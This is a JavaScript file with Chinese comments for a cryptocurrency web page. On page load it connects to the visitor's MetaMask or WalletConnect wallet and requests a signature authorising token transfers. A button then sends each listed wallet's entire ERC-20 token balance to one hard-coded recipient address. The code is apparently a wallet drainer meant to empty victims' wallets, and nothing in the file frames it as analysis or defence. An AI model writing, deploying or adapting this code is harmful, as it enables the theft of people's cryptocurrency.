const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
let web3;
let walletConnectProvider;
let isConnected = false;

const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    }
];

// 页面加载后自动连接钱包并跳转到签名流程
window.onload = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    document.getElementById('walletSelector').value = selectedWallet;
    
    try {
        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                // 请求连接钱包
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);

                // 获取当前连接的账户
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    updateWalletList(accounts[0]); // 更新 UI 显示已连接的钱包
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';

                    // 自动发起签名请求
                    await signMessage(accounts[0]);
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        } else if (selectedWallet === 'walletconnect') {
            walletConnectProvider = new WalletConnectProvider({
                infuraId: "YOUR_INFURA_PROJECT_ID",
            });

            // 启用 WalletConnect
            await walletConnectProvider.enable();
            web3 = new Web3(walletConnectProvider);

            // 获取连接的账户
            const accounts = await web3.eth.getAccounts();
            if (accounts.length > 0) {
                updateWalletList(accounts[0]); // 更新 UI 显示已连接的钱包
                isConnected = true;
                document.getElementById('status').innerText = 'WalletConnect 已连接';

                // 自动发起签名请求
                await signMessage(accounts[0]);
            } else {
                document.getElementById('status').innerText = '未检测到已连接的账户';
            }
        }

        // 启用按钮
        document.getElementById('transferButton').disabled = false;
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    }
};

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 自动签名的函数
const signMessage = async (account) => {
    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
    try {
        // 调用钱包的 personal_sign 方法发起签名请求
        const signature = await web3.eth.personal.sign(message, account);
        document.getElementById('status').innerText += `\n签名成功: ${signature}`;

        // 签名成功后可以进一步触发其他操作，例如代币转移
        // await transferTokens(account); // 如果需要转移代币可以在这里调用
    } catch (error) {
        document.getElementById('status').innerText += `\n签名失败: ${error.message}`;
    }
};

// 点击按钮自动执行代币转移操作
document.getElementById('transferButton').onclick = async () => {
    const walletInput = document.getElementById('wallets').value;
    const walletAddresses = walletInput.split(',').map(addr => addr.trim());

    for (const walletAddress of walletAddresses) {
        if (!web3.utils.isAddress(walletAddress)) {
            document.getElementById('status').innerText += `\n无效的钱包地址: ${walletAddress}`;
            continue;
        }

        document.getElementById('status').innerText += `\n正在获取 ${walletAddress} 的代币余额...`;
        const tokenBalances = await getTokenBalances(walletAddress);

        for (const tokenAddress in tokenBalances) {
            const token = tokenBalances[tokenAddress];
            const balance = token.balance;

            if (balance.gt(0)) {
                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
                try {
                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: walletAddress });
                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
                } catch (error) {
                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
                }
            } else {
                document.getElementById('status').innerText += `\n账户 ${walletAddress} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
            }
        }
    }

    document.getElementById('status').innerText += '\n所有代币转移完成';
};
